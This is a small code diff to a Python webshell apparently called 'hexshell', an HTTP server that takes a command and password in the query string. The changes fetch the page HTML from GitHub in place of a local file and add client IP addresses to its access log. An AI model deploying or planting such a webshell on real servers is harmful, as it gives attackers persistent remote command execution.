@@ -19,8 +19,6 @@ print("""
 
 INDEX = requests.get("https://raw.githubusercontent.com/Falcn8/hexshell/master/index.html").text
 
-INDEX = open("index.html").read()
-
 class Webshell(BaseHTTPRequestHandler):
     def _send_response(self, message):
         self.send_response(200)
@@ -54,7 +52,7 @@ class Webshell(BaseHTTPRequestHandler):
             self.wfile.write(b'Please specify the command and the password')
             return
         with open("hexshell.access.log", "a+") as f:
-            f.write(str(query["pw"][0] == PASSWORD)+" "+json.dumps(query)+"\n")
+            f.write(str(query["pw"][0] == PASSWORD)+" "+str(self.client_address[0])+" "+json.dumps(query)+"\n")
         if query["pw"][0] != PASSWORD:
             self.send_response(403)
             self.send_header('Content-type', 'text/html')
